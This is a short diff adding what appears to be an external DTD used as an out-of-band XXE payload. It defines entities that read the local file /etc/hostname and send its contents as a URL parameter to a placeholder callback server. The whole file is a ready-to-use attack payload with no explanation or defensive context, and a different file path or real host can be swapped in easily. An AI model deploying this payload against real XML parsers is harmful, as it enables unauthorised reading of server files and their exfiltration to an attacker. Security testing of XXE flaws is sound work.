@@ -1,0 +1,7 @@
+<!ENTITY % payload SYSTEM "file:///etc/hostname">
+
+<!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://your-callback-server.com/?data=%payload;'>">
+
+%wrapper;
+
+%send;
